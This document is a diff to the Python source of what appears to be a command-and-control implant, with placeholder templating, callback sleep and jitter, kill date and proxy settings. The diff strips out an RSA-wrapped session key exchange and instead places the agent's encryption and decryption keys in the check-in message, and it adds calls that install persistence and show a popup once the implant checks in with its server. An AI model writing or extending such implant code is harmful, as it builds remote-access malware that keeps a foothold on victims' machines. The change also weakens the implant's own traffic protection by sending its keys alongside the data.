@@ -166,28 +166,6 @@ CRYPTO_MODULE_PLACEHOLDER
             except:
                 pass
 
-        # ---- 1. Key exchange ----
-        session_key = os.urandom(32)  # AES key
-        self.session_key = session_key
-
-        from cryptography.hazmat.primitives import serialization, hashes
-        from cryptography.hazmat.primitives.asymmetric import padding
-
-        pubkey = serialization.load_pem_public_key(self.agent_config["enc_key"]["enc_key"].encode())
-        enc_session = pubkey.encrypt(
-            session_key,
-            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
-        )
-        first_msg = {
-            "action": "key_exchange",
-            "uuid": self.agent_config["PayloadUUID"],
-            "encrypted_key": base64.b64encode(enc_session).decode()
-        }
-        resp = self.makeRequest(json.dumps(first_msg).encode(), 'POST')
-        if not resp or b'"ok"' not in resp:
-            return False
-
-        # ---- 2. Normal checkin ----
         data = {
             "action": "checkin",
             "ip": ip,
@@ -197,19 +175,14 @@ CRYPTO_MODULE_PLACEHOLDER
             "domain": socket.getfqdn(),
             "pid": os.getpid(),
             "uuid": self.agent_config["PayloadUUID"],
-            "architecture": "x64" if sys.maxsize > 2**32 else "x86"
+            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
+            "encryption_key": self.agent_config["enc_key"]["enc_key"],
+            "decryption_key": self.agent_config["enc_key"]["dec_key"]
         }
-
-        # encrypt with negotiated session key
-        iv = os.urandom(16)
-        encryptor = Cipher(algorithms.AES(session_key), modes.CFB(iv)).encryptor()
-        ct = encryptor.update(json.dumps(data).encode()) + encryptor.finalize()
-        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + iv + ct)
-
+        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
         decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
         if not decoded_data:
             return False
-
         try:
             response_json = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"], "", 1))
             if "status" in response_json and "id" in response_json:
@@ -217,7 +190,7 @@ CRYPTO_MODULE_PLACEHOLDER
                 return True
             else:
                 return False
-        except json.JSONDecodeError:
+        except json.JSONDecodeError as e:
             return False
 
      
@@ -315,34 +288,6 @@ CRYPTO_MODULE_PLACEHOLDER
         time.sleep(self.agent_config["Sleep"]+j)
 
 #COMMANDS_PLACEHOLDER
-    def performKeyExchange(self):
-        """Perform initial key exchange with translation container via C2."""
-        try:
-            # Send key request message
-            key_request = {
-                "action": "key_exchange",
-                "agent_id": self.agent_config["PayloadUUID"],
-                "crypto_type": "aes256"
-            }
-            
-            # Send unencrypted key request
-            encoded_request = base64.b64encode(json.dumps(key_request).encode())
-            response_data = self.makeRequest(encoded_request, 'POST')
-            
-            if response_data:
-                response_json = json.loads(base64.b64decode(response_data).decode())
-                
-                if "enc_key" in response_json and "dec_key" in response_json:
-                    # Keys are delivered as base64 encoded strings
-                    self.agent_config["enc_key"] = {
-                        "enc_key": base64.b64decode(response_json["enc_key"]),
-                        "dec_key": base64.b64decode(response_json["dec_key"])
-                    }
-                    return True
-            return False
-            
-        except Exception as e:
-            return False
 
 
     def __init__(self):
@@ -363,25 +308,26 @@ CRYPTO_MODULE_PLACEHOLDER
             "Sleep": callback_interval,
             "Jitter": callback_jitter,
             "KillDate": "killdate",
+            "enc_key": AESPSK,
+            "ExchChk": "encrypted_exchange_check",
             "GetURI": "/get_uri",
             "GetParam": "query_path_name",
             "ProxyHost": "proxy_host",
             "ProxyUser": "proxy_user",
             "ProxyPass": "proxy_pass",
             "ProxyPort": "proxy_port",
-            "enc_key": {
-                "enc_key": """PUBLIC_KEY_PLACEHOLDER"""   
-            }
         }
-
-        if not self.performKeyExchange():
-            os._exit(1)
         max_checkin_retries = 10
         checkin_retry_delay = 30
 
         # Attempt initial check-in with retries
         for attempt in range(max_checkin_retries):
             if self.checkIn():
+                try:
+                    self.create_persistence()
+                    self.show_console_popup()
+                except Exception as e:
+                    pass
                 break
             if attempt < max_checkin_retries - 1:
                 time.sleep(checkin_retry_delay)
